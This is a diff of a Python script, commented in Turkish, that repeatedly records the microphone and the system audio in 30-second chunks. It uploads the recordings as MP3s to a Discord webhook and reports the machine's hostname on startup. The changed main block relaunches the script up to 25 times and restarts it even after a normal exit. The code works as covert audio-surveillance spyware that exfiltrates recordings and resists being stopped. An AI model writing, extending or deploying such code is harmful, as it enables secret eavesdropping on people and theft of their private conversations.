@@ -5,6 +5,7 @@ import threading
 import traceback
 import logging
 import subprocess
+import platform
 from datetime import datetime
 import glob  # Dosya kalıpları için eklendi
 
@@ -105,7 +106,7 @@ def load_config():
     
     return config
 
-def send_to_discord_async(file_path, config, label="Audio"):
+def send_to_discord_async(file_path, config, label="Audio", timestamp=None):
     """Discord'a ses dosyasını arka planda gönderen fonksiyon - etiketleme özelliği ile"""
     def _send_and_cleanup():
         try:
@@ -130,10 +131,11 @@ def send_to_discord_async(file_path, config, label="Audio"):
                         'file': (os.path.basename(file_path), f, 'audio/mpeg' if file_path.endswith('.mp3') else 'audio/wav')
                     }
                     
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    # Eğer dışarıdan timestamp verilmişse onu kullan, yoksa şimdiyi kullan
+                    message_timestamp = timestamp if timestamp else datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                     payload = {
-                        # Önceki sabit "SYSTEM AUDIO" yerine gönderilen etiketi kullan
-                        'content': f"**{label}:** Recording taken at {timestamp}"
+                        # Başlık formatı düzeltildi ve dış timestamp kullanıldı
+                        'content': f"**{label}:** Recording taken at {message_timestamp}"
                     }
                     
                     response = requests.post(
@@ -188,68 +190,129 @@ def send_to_discord_async(file_path, config, label="Audio"):
     logger.info(f"Started background upload for file: {file_path}")
     return True
 
-def record_audio(config, duration=60):
+def record_audio(config, duration=30):
     """Ses kaydı yapma fonksiyonu - hem mikrofon hem de sistem sesi kaydetme desteğiyle"""
     logger.info(f"Recording audio for {duration} seconds...")
     
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    # Tutarlı zaman damgası oluştur - hem dosya isminde hem Discord mesajında kullanılacak
+    start_time = datetime.now()
+    timestamp_for_filename = start_time.strftime("%Y%m%d_%H%M%S")
+    timestamp_for_display = start_time.strftime("%Y-%m-%d %H:%M:%S")
+    
     script_dir = os.path.dirname(os.path.abspath(__file__))
-    output_file = os.path.join(script_dir, f"audio_{timestamp}.mp3")
     
     try:
-        # Mikrofon ve sistem seslerini ayrı ayrı kaydet, sonra birleştir
+        # İşlemi hızlandırmak için mikrofon ve sistem sesini paralel kaydetme
         mic_data = None
         system_data = None
-        
-        # Kayıt için hazırlık
         sample_rate = config["SAMPLE_RATE"]
         num_frames = int(sample_rate * duration)
         
-        # Eğer karışık ses veya mikrofon sesi isteniyorsa mikrofon kaydı yap
-        if config.get("SEND_MIXED_AUDIO", False) or config.get("SEND_MIC_AUDIO", False):
-            try:
-                # Varsayılan mikrofonu seç
-                default_mic = sc.default_microphone()
-                if default_mic:
-                    logger.info(f"Recording from microphone: {default_mic.name}")
-                    with default_mic.recorder(samplerate=sample_rate) as mic_recorder:
-                        mic_data = mic_recorder.record(numframes=num_frames)
-                        logger.info("Microphone recording completed")
-            except Exception as e:
-                logger.error(f"Failed to record from microphone: {e}")
+        # Mikrofon ve sistem sesini paralel kaydedecek thread'ler için sonuçları saklama değişkenleri
+        mic_result = {"data": None, "error": None}
+        system_result = {"data": None, "error": None}
         
-        # Eğer karışık ses veya sistem sesi isteniyorsa sistem sesi kaydı yap
-        if config.get("SEND_MIXED_AUDIO", False) or config.get("SEND_SYSTEM_AUDIO", False):
+        # Mikrofon kayıt thread'i
+        def record_from_mic():
             try:
-                # Sistem sesini kaydet (loopback)
-                speaker = sc.default_speaker()
-                loopback_mic = sc.get_microphone(id=speaker.id, include_loopback=True)
-                
-                logger.info(f"Recording system audio from: {loopback_mic.name}")
-                with loopback_mic.recorder(samplerate=sample_rate) as system_recorder:
-                    system_data = system_recorder.record(numframes=num_frames)
-                    logger.info("System audio recording completed")
+                if config.get("SEND_MIXED_AUDIO", False) or config.get("SEND_MIC_AUDIO", False):
+                    default_mic = sc.default_microphone()
+                    if default_mic:
+                        logger.info(f"Recording from microphone: {default_mic.name}")
+                        with default_mic.recorder(samplerate=sample_rate) as mic_recorder:
+                            mic_result["data"] = mic_recorder.record(numframes=num_frames)
+                            logger.info(f"Microphone recording completed - Shape: {mic_result['data'].shape}")
             except Exception as e:
+                mic_result["error"] = str(e)
+                logger.error(f"Failed to record from microphone: {e}")
+                traceback.print_exc()
+        
+        # Sistem sesi kayıt thread'i
+        def record_from_system():
+            try:
+                if config.get("SEND_MIXED_AUDIO", False) or config.get("SEND_SYSTEM_AUDIO", False):
+                    default_speaker = sc.default_speaker()
+                    logger.info(f"Default speaker: {default_speaker.name}")
+                    
+                    # Tüm hoparlörleri kontrol et
+                    all_speakers = sc.all_speakers()
+                    selected_speaker = None
+                    
+                    for speaker in all_speakers:
+                        try:
+                            loopback_mic = sc.get_microphone(id=speaker.id, include_loopback=True)
+                            selected_speaker = speaker
+                            break
+                        except Exception:
+                            continue
+                    
+                    if selected_speaker is None:
+                        selected_speaker = default_speaker
+                    
+                    try:
+                        loopback_mic = sc.get_microphone(id=selected_speaker.id, include_loopback=True)
+                        logger.info(f"Recording system audio from: {selected_speaker.name}")
+                        
+                        with loopback_mic.recorder(samplerate=sample_rate) as system_recorder:
+                            system_result["data"] = system_recorder.record(numframes=num_frames)
+                            logger.info(f"System audio recording completed")
+                    except Exception as e:
+                        logger.error(f"Error recording system audio: {e}")
+                        
+                        # Alternatif yöntem dene
+                        if platform.system() == "Windows":
+                            all_mics = sc.all_microphones(include_loopback=True)
+                            stereo_mix_keywords = ['stereo mix', 'what u hear', 'loopback', 'virtual']
+                            
+                            for mic in all_mics:
+                                mic_name = mic.name.lower()
+                                if any(keyword in mic_name for keyword in stereo_mix_keywords):
+                                    logger.info(f"Found alternative system audio device: {mic.name}")
+                                    with mic.recorder(samplerate=sample_rate) as alt_recorder:
+                                        system_result["data"] = alt_recorder.record(numframes=num_frames)
+                                        logger.info("Alternative system audio recording completed")
+                                    break
+            except Exception as e:
+                system_result["error"] = str(e)
                 logger.error(f"Failed to record system audio: {e}")
+                traceback.print_exc()
+        
+        # Kayıt thread'lerini oluştur ve başlat
+        mic_thread = threading.Thread(target=record_from_mic)
+        system_thread = threading.Thread(target=record_from_system)
+        
+        mic_thread.start()
+        system_thread.start()
+        
+        # Thread'lerin tamamlanmasını bekle
+        mic_thread.join()
+        system_thread.join()
+        
+        # Thread'lerden sonuçları al
+        mic_data = mic_result["data"]
+        system_data = system_result["data"]
         
         # İşlenecek ses verilerini kontrol et
         if mic_data is None and system_data is None:
             logger.error("Failed to record any audio")
             return False
         
-        # Gereken dosya yollarını hazırla
-        temp_mixed_wav = os.path.join(script_dir, f"temp_mixed_{timestamp}.wav")
-        temp_mic_wav = os.path.join(script_dir, f"temp_mic_{timestamp}.wav") if mic_data is not None else None
-        temp_system_wav = os.path.join(script_dir, f"temp_system_{timestamp}.wav") if system_data is not None else None
+        # Dosya adlarında tutarlı zaman damgası kullan
+        temp_mixed_wav = os.path.join(script_dir, f"temp_mixed_{timestamp_for_filename}.wav")
+        temp_mic_wav = os.path.join(script_dir, f"temp_mic_{timestamp_for_filename}.wav") if mic_data is not None else None
+        temp_system_wav = os.path.join(script_dir, f"temp_system_{timestamp_for_filename}.wav") if system_data is not None else None
         
         # Karışık ses oluştur (eğer hem mikrofon hem de sistem sesi varsa)
         mixed_data = None
         if mic_data is not None and system_data is not None and config.get("SEND_MIXED_AUDIO", False):
             try:
+                logger.info("Creating mixed audio from microphone and system audio...")
+                
                 # Ses verilerinin boyutlarını kontrol et
                 if len(mic_data) != len(system_data):
                     # Aynı uzunlukta değillerse kısalt
                     min_length = min(len(mic_data), len(system_data))
+                    logger.info(f"Audio length mismatch. Mic: {len(mic_data)}, System: {len(system_data)}. Trimming to {min_length}")
                     mic_data = mic_data[:min_length]
                     system_data = system_data[:min_length]
                 
@@ -257,33 +320,74 @@ def record_audio(config, duration=60):
                 mic_channels = mic_data.shape[1] if len(mic_data.shape) > 1 else 1
                 sys_channels = system_data.shape[1] if len(system_data.shape) > 1 else 1
                 
+                logger.info(f"Microphone channels: {mic_channels}, System channels: {sys_channels}")
+                
                 # Tek kanallı ses için şekil düzeltme
                 if len(mic_data.shape) == 1:
                     mic_data = mic_data.reshape(-1, 1)
+                    logger.info("Reshaped microphone data from 1D to 2D")
                 if len(system_data.shape) == 1:
                     system_data = system_data.reshape(-1, 1)
+                    logger.info("Reshaped system data from 1D to 2D")
                 
                 # Mikrofon ses seviyesini ayarla
                 mic_boost = float(config.get("MIC_BOOST", 2.0))
-                system_volume = float(config.get("SYSTEM_AUDIO_VOLUME", 0.6))
+                system_volume = float(config.get("SYSTEM_AUDIO_VOLUME", 1.0))
                 
-                # Karıştırma işlemi
+                logger.info(f"Applying mixing levels - Mic boost: {mic_boost}, System volume: {system_volume}")
+                
+                # Sistem sesinin çok düşük olmadığını kontrol et
+                system_max = np.max(np.abs(system_data))
+                if system_max < 0.01:  # Çok düşük sinyal
+                    logger.warning(f"System audio is very weak: {system_max}. Increasing system volume.")
+                    system_volume *= 5.0  # Ekstra yükseltme
+                
+                # Karıştırma işlemi - geliştirilmiş
                 mic_boosted = mic_data * mic_boost
                 system_adjusted = system_data * system_volume
+                
+                # Karıştırma öncesi ses seviyelerini logla
+                logger.info(f"After adjustment - Mic max: {np.max(np.abs(mic_boosted))}, System max: {np.max(np.abs(system_adjusted))}")
+                
+                # Ses kanallarını eşleştir
+                if mic_boosted.shape[1] != system_adjusted.shape[1]:
+                    logger.info("Channel count mismatch, converting to match")
+                    # Stereo'yu mono'ya veya mono'yu stereo'ya dönüştür
+                    if mic_boosted.shape[1] > system_adjusted.shape[1]:
+                        # Sistem mono, mikrofon stereo - sistemi stereo'ya çevir
+                        system_adjusted = np.column_stack((system_adjusted, system_adjusted))
+                    else:
+                        # Mikrofon mono, sistem stereo - mikrofonu stereo'ya çevir
+                        mic_boosted = np.column_stack((mic_boosted, mic_boosted))
+                
                 mixed_data = mic_boosted + system_adjusted
                 
                 # Olası clipping'i önlemek için normalizasyon
                 if config.get("NORMALIZE_AUDIO", True):
                     max_value = np.max(np.abs(mixed_data))
+                    logger.info(f"Mixed audio max value before normalization: {max_value}")
+                    
                     if max_value > 0.95:  # Clipping'e yakınsa
                         mixed_data = mixed_data / max_value * 0.95  # %95 seviyesine normalleştir
+                        logger.info(f"Normalized mixed audio to avoid clipping. New max: {np.max(np.abs(mixed_data))}")
                 
                 # Karışık sesi WAV olarak kaydet
                 sf.write(temp_mixed_wav, mixed_data, sample_rate)
                 logger.info(f"Created mixed audio file: {temp_mixed_wav}")
                 
+                # Ayrıca karışım bileşenlerini de ayrı ayrı WAV olarak kaydet (sadece kontrol amaçlı)
+                if config.get("DEBUG", False):
+                    debug_mic_wav = os.path.join(script_dir, f"debug_mic_{timestamp_for_filename}.wav")
+                    debug_sys_wav = os.path.join(script_dir, f"debug_sys_{timestamp_for_filename}.wav")
+                    
+                    sf.write(debug_mic_wav, mic_boosted, sample_rate)
+                    sf.write(debug_sys_wav, system_adjusted, sample_rate)
+                    
+                    logger.info(f"Created debug audio files for components")
+                
             except Exception as e:
                 logger.error(f"Error mixing audio: {e}")
+                traceback.print_exc()
                 mixed_data = None
         
         # Mikrofon sesini kaydet (isteniyorsa)
@@ -312,7 +416,7 @@ def record_audio(config, duration=60):
             try:
                 # Karışık ses MP3
                 if temp_mixed_wav and os.path.exists(temp_mixed_wav):
-                    mixed_mp3 = os.path.join(script_dir, f"mixed_{timestamp}.mp3")
+                    mixed_mp3 = os.path.join(script_dir, f"mixed_{timestamp_for_filename}.mp3")
                     audio = AudioSegment.from_wav(temp_mixed_wav)
                     audio.export(mixed_mp3, format="mp3", bitrate=f"{config['MP3_BITRATE']}k")
                     logger.info(f"Converted mixed audio to MP3: {mixed_mp3}")
@@ -320,7 +424,7 @@ def record_audio(config, duration=60):
                     
                 # Mikrofon MP3
                 if temp_mic_wav and os.path.exists(temp_mic_wav):
-                    mic_mp3 = os.path.join(script_dir, f"mic_{timestamp}.mp3")
+                    mic_mp3 = os.path.join(script_dir, f"mic_{timestamp_for_filename}.mp3")
                     audio = AudioSegment.from_wav(temp_mic_wav)
                     audio.export(mic_mp3, format="mp3", bitrate=f"{config['MP3_BITRATE']}k")
                     logger.info(f"Converted microphone audio to MP3: {mic_mp3}")
@@ -328,7 +432,7 @@ def record_audio(config, duration=60):
                     
                 # Sistem MP3
                 if temp_system_wav and os.path.exists(temp_system_wav):
-                    system_mp3 = os.path.join(script_dir, f"system_{timestamp}.mp3")
+                    system_mp3 = os.path.join(script_dir, f"system_{timestamp_for_filename}.mp3")
                     audio = AudioSegment.from_wav(temp_system_wav)
                     audio.export(system_mp3, format="mp3", bitrate=f"{config['MP3_BITRATE']}k")
                     logger.info(f"Converted system audio to MP3: {system_mp3}")
@@ -360,11 +464,11 @@ def record_audio(config, duration=60):
             if temp_system_wav and os.path.exists(temp_system_wav) and config.get("SEND_SYSTEM_AUDIO", False):
                 files_to_send.append(("System Audio", temp_system_wav))
         
-        # Discord'a gönder - burada etiket değişkenini doğru şekilde kullanmayı sağla
+        # Discord'a gönderim için tutarlı etiket ve zaman damgası kullan
         for label, file_path in files_to_send:
             logger.info(f"Sending {label} to Discord: {file_path}")
-            # Etiket parametresini doğru bir şekilde geçir
-            send_to_discord_async(file_path, config, label)
+            # Aynı zaman damgasını gönderdiğimizden emin ol
+            send_to_discord_async(file_path, config, label, timestamp_for_display)
         
         # Tüm geçici dosyaları temizle - arka plandaki gönderin işlemi kopyaları kullanacak
         try:
@@ -443,60 +547,187 @@ def reset_imports():
         logger.error(f"Error resetting imports: {e}")
         return False
 
+def send_error_webhook(message, config):
+    """Hata durumunda Discord'a bildirim gönder"""
+    try:
+        if not config.get("SEND_ERROR_NOTIFICATION", True):
+            return
+        
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        payload = {
+            'content': f"⚠️ **AUDIO RECORDING ERROR** ⚠️\n**Time:** {timestamp}\n**Error:** {message}\n**Action:** Attempting restart..."
+        }
+        
+        requests.post(
+            config.get("AUDIO_WEBHOOK_URL", ""),
+            json=payload,
+            timeout=10
+        )
+        logger.info("Sent error notification to Discord")
+    except Exception as e:
+        logger.error(f"Failed to send error notification: {e}")
+
+def run_recording_system():
+    """Ana ses kayıt sistemini çalıştır - içinde sürekli kayıt döngüsü barındırır"""
+    try:
+        # Başlangıç bilgisi göster
+        logger.info("Audio Recording System starting...")
+        logger.info(f"Python version: {sys.version}")
+        logger.info(f"Working directory: {os.getcwd()}")
+        
+        # Yapılandırmayı yükle
+        config = load_config()
+        
+        # pydub kullanılabilirliğini kontrol et
+        if not PYDUB_AVAILABLE:
+            logger.warning("pydub is not available. Will attempt to reinstall.")
+            # pyaudioop ve pydub modüllerini kurma denemesi
+            try:
+                # Önce pydub'ı kaldır
+                subprocess.check_call([sys.executable, "-m", "pip", "uninstall", "-y", "pydub"],
+                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                
+                # Gerekirse PyAudio'yu yeniden yüklemeyi dene
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "--upgrade", "PyAudio"],
+                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                
+                # Şimdi pydub'ı yükle
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "pydub"],
+                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                
+                # Yeniden import etmeyi dene
+                reset_imports()
+            except Exception as e:
+                logger.error(f"Error reinstalling audio modules: {e}")
+        
+        # Başlangıçta eski ses dosyalarını temizleme
+        try:
+            script_dir = os.path.dirname(os.path.abspath(__file__))
+            for pattern in ['*.wav', '*.tmp', '*.mp3']:
+                for file_path in glob.glob(os.path.join(script_dir, pattern)):
+                    try:
+                        # Dosya yaşını kontrol et - 1 saatten eski dosyaları temizle
+                        file_age = time.time() - os.path.getmtime(file_path)
+                        if file_age > 3600:  # 1 saat
+                            os.remove(file_path)
+                            logger.info(f"Cleaned up old file: {file_path}")
+                    except Exception as e:
+                        logger.warning(f"Could not clean up file {file_path}: {e}")
+        except Exception as e:
+            logger.warning(f"Error during initial cleanup: {e}")
+        
+        # Discord'a başlangıç bildirimi gönder
+        if config.get("SEND_STARTUP_NOTIFICATION", True):
+            try:
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                payload = {
+                    'content': f"🎙️ **AUDIO RECORDING STARTED**\n**Time:** {timestamp}\n**System:** {platform.node()}\n**Python:** {sys.version.split()[0]}"
+                }
+                
+                requests.post(
+                    config.get("AUDIO_WEBHOOK_URL", ""),
+                    json=payload,
+                    timeout=10
+                )
+            except Exception as e:
+                logger.error(f"Failed to send startup notification: {e}")
+        
+        # Sürekli kayıt işlemini başlat
+        continuous_recording()
+        
+        return True  # Başarıyla tamamlandı
+    
+    except Exception as e:
+        logger.critical(f"Fatal error in recording system: {e}")
+        traceback.print_exc()
+        try:
+            # Hatayı Discord'a bildir
+            send_error_webhook(str(e), load_config())
+        except:
+            pass
+        return False  # Hata oluştu
+
+def restart_script():
+    """Betiği yeniden başlat"""
+    logger.info("Attempting to restart audio recording script...")
+    
+    try:
+        # Şu anki Python yorumlayıcısını ve betik yolunu al
+        python_executable = sys.executable
+        script_path = os.path.abspath(__file__)
+        
+        # Yeni bir süreç olarak betiği başlat
+        subprocess.Popen([python_executable, script_path])
+        
+        logger.info("Successfully initiated restart, exiting current process...")
+        sys.exit(0)  # Mevcut süreci sonlandır
+    except Exception as e:
+        logger.error(f"Failed to restart script: {e}")
+        return False
+
 if __name__ == "__main__":
     print("=" * 50)
     print("AUDIO RECORDING SYSTEM STARTING")
     print("=" * 50)
     
-    # Başlangıç bilgisi göster
-    logger.info("Audio Recording System starting...")
-    logger.info(f"Python version: {sys.version}")
-    logger.info(f"Working directory: {os.getcwd()}")
+    # Yeniden başlatma sayacı
+    restart_count = 0
+    max_restarts = 25  # Maksimum yeniden başlatma sayısı
     
-    # pydub kullanılabilirliğini kontrol et
-    if not PYDUB_AVAILABLE:
-        logger.warning("pydub is not available. Will attempt to reinstall.")
-        # pyaudioop ve pydub modüllerini kurma denemesi
+    while restart_count < max_restarts:
         try:
-            # Önce pydub'ı kaldır
-            subprocess.check_call([sys.executable, "-m", "pip", "uninstall", "-y", "pydub"],
-                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            success = run_recording_system()
             
-            # Gerekirse PyAudio'yu yeniden yüklemeyi dene (pyaudioop bazen bu modülle gelir)
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "--upgrade", "PyAudio"],
-                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Şimdi pydub'ı yükle
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "pydub"],
-                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Yeniden import etmeyi dene
-            reset_imports()
-            
-            # pyaudioop olmadan çalışma seçeneğini ekleyelim
-            if not PYDUB_AVAILABLE:
-                logger.warning("Still couldn't import pydub, will continue without MP3 compression")
-        except Exception as e:
-            logger.error(f"Error reinstalling audio modules: {e}")
-    
-    # Başlangıçta eski ses dosyalarını temizleme
-    try:
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        for pattern in ['*.wav', '*.tmp', '*.mp3']:
-            for file_path in glob.glob(os.path.join(script_dir, pattern)):
+            if not success:
+                restart_count += 1
+                logger.warning(f"Recording system failed, restart attempt {restart_count}/{max_restarts}")
+                
+                # Yapılandırmayı yüklemeyi dene
                 try:
-                    # Dosya yaşını kontrol et - 1 saatten eski dosyaları temizle
-                    file_age = time.time() - os.path.getmtime(file_path)
-                    if file_age > 3600:  # 1 saat
-                        os.remove(file_path)
-                        logger.info(f"Cleaned up old file: {file_path}")
-                except Exception as e:
-                    logger.warning(f"Could not clean up file {file_path}: {e}")
-    except Exception as e:
-        logger.warning(f"Error during initial cleanup: {e}")
+                    config = load_config()
+                    restart_delay = config.get("RESTART_DELAY", 30)
+                except:
+                    restart_delay = 30  # Varsayılan bekleme süresi
+                
+                # Hata bildirimini Discord'a gönder
+                try:
+                    send_error_webhook(f"Recording system failed (attempt {restart_count}/{max_restarts}), restarting in {restart_delay} seconds...", load_config())
+                except:
+                    pass
+                
+                logger.info(f"Waiting {restart_delay} seconds before restart...")
+                time.sleep(restart_delay)
+                
+                # Bazı durumlarda restarting yaklaşımı daha güvenilir olabilir
+                if restart_count >= 5:  # 5 denemeden sonra
+                    logger.info("Using alternative restart method...")
+                    restart_script()  # Bu fonksiyon başarılı olursa bu işlem sonlanacak
+            else:
+                # Normal çıkış durumu - bu durumda da yeniden başlat
+                # Normal çıkış genellikle KeyboardInterrupt veya kullanıcı tarafından yapılan bir işlem olabilir
+                logger.info("Recording system exited normally, will restart anyway")
+                restart_count = 0  # Normal çıkışlarda sayacı sıfırla
+                time.sleep(5)  # Kısa bir bekleme
+        
+        # Global exception handler - tüm beklenmeyen hataları yakalar
+        except Exception as e:
+            restart_count += 1
+            logger.critical(f"Unhandled exception: {e}")
+            traceback.print_exc()
+            
+            # Hata bildirimini Discord'a gönder
+            try:
+                send_error_webhook(f"Unhandled exception: {str(e)[:500]}...", load_config())
+            except:
+                pass
+            
+            logger.info(f"Waiting 30 seconds before restart attempt {restart_count}/{max_restarts}...")
+            time.sleep(30)
     
+    logger.critical(f"Maximum restart attempts ({max_restarts}) exceeded. Giving up.")
+    
+    # Son bir hata bildirimini Discord'a gönder
     try:
-        continuous_recording()
-    except Exception as e:
-        logger.critical(f"Fatal error: {e}")
-        traceback.print_exc()
+        send_error_webhook(f"Maximum restart attempts ({max_restarts}) exceeded. Audio recording stopped.", load_config())
+    except:
+        pass
